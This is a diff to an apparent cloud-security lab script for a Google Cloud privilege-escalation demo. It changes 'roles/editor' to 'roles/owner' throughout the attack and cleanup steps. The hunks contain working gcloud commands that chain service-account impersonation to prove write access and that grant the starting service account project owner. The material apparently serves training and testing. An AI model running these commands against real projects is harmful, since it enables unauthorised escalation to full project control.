@@ -282,7 +282,7 @@ echo -e "${GREEN}✓ Read flag as $TARGET_SA_EMAIL via chained impersonation${NC
 
 # Step 4: [THE ATTACK] Verify broader escalated access (write proof).
 # Same full delegation chain — proves the escalation goes beyond just reading the flag.
-echo -e "${YELLOW}Step 4: [EXPLOIT] Verifying full roles/editor access via target SA (write proof)${NC}"
+echo -e "${YELLOW}Step 4: [EXPLOIT] Verifying full roles/owner access via target SA (write proof)${NC}"
 show_attack_cmd "$TARGET_SA_EMAIL" \
     "gcloud projects update $PROJECT_ID --update-labels=pl-privesc-verified=true --impersonate-service-account=$STARTING_SA_EMAIL,$TARGET_SA_EMAIL"
 if gcloud projects update "$PROJECT_ID" \
@@ -290,7 +290,7 @@ if gcloud projects update "$PROJECT_ID" \
         --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
         --quiet 2>/dev/null; then
     echo -e "${GREEN}✓ Successfully wrote a project label as $TARGET_SA_EMAIL!${NC}"
-    echo -e "${GREEN}✓ PROJECT EDITOR ACCESS CONFIRMED (roles/editor)${NC}"
+    echo -e "${GREEN}✓ PROJECT OWNER ACCESS CONFIRMED (roles/owner)${NC}"
     gcloud projects update "$PROJECT_ID" \
         --remove-labels=pl-privesc-verified \
         --impersonate-service-account="$STARTING_SA_EMAIL,$TARGET_SA_EMAIL" \
@@ -475,13 +475,13 @@ The end-of-demo note enumerates them so the reader understands the delta between
 
 ```bash
 echo -e "${YELLOW}Step N: Granting ourselves an elevated project role${NC}"
-show_attack_cmd "Attacker" "gcloud projects add-iam-policy-binding $PROJECT_ID --member=serviceAccount:$STARTING_SA_EMAIL --role=roles/editor"
+show_attack_cmd "Attacker" "gcloud projects add-iam-policy-binding $PROJECT_ID --member=serviceAccount:$STARTING_SA_EMAIL --role=roles/owner"
 gcloud projects add-iam-policy-binding "$PROJECT_ID" \
     --member="serviceAccount:$STARTING_SA_EMAIL" \
-    --role="roles/editor" \
+    --role="roles/owner" \
     --quiet
 
-echo -e "${GREEN}✓ Successfully added editor role${NC}\n"
+echo -e "${GREEN}✓ Successfully added owner role${NC}\n"
 
 echo -e "${YELLOW}Waiting for IAM policy to propagate...${NC}"
 sleep 15
@@ -590,13 +590,13 @@ echo -e "${YELLOW}To remove all infrastructure, set the scenario flag to false a
 ```bash
 echo -e "${YELLOW}Step 2: Removing added project role binding${NC}"
 if gcloud projects get-iam-policy "$PROJECT_ID" --flatten="bindings[].members" \
-    --filter="bindings.role=roles/editor AND bindings.members:serviceAccount:$STARTING_SA_EMAIL" \
-    --format="value(bindings.role)" | grep -q roles/editor; then
+    --filter="bindings.role=roles/owner AND bindings.members:serviceAccount:$STARTING_SA_EMAIL" \
+    --format="value(bindings.role)" | grep -q roles/owner; then
     gcloud projects remove-iam-policy-binding "$PROJECT_ID" \
         --member="serviceAccount:$STARTING_SA_EMAIL" \
-        --role="roles/editor" \
+        --role="roles/owner" \
         --quiet
-    echo -e "${GREEN}✓ Removed editor role binding${NC}"
+    echo -e "${GREEN}✓ Removed owner role binding${NC}"
 else
     echo -e "${YELLOW}Binding not found (may already be removed)${NC}"
 fi
